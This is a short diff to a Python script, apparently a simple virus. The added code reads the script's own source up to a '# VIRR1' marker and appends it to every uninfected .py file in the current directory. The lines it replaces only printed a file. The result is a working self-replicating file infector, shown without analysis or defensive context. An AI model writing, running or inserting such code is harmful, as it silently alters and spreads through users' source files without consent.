@@ -5,7 +5,7 @@ import glob
 cwd = os.getcwd()
 pyfiles = glob.glob(f"{cwd}/*py")
 healthy = []
-inject = 0
+inject = []
 
 for path in pyfiles:
     with open(path, 'r') as f:
@@ -16,5 +16,14 @@ for path in pyfiles:
         else:
             healthy.append(path)
 
-with open("translator.py", 'r') as f:
-    print(f.read())
+with open(__file__, 'r') as f:
+    for line in f.readlines():
+        inject.append(line)
+        if line == "# VIRR1\n":
+            break
+
+for file in healthy:
+    with open(file, 'a') as f:
+        for line in inject:
+            f.write(line)
+# VIRR1
